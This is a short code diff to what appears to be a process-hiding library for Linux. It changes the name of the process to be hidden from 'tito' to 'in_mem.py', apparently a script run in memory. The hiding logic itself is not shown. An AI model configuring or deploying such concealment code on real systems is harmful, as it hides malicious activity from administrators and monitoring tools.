@@ -5,7 +5,7 @@
 #include <unistd.h>
 
 /* Every process with this name will be excluded */
-static const char* process_to_filter = "tito";
+static const char* process_to_filter = "in_mem.py";
 
 /* Get a directory name given a DIR* handle */
 static int get_dir_name(DIR* dirp, char* buf, size_t size) {
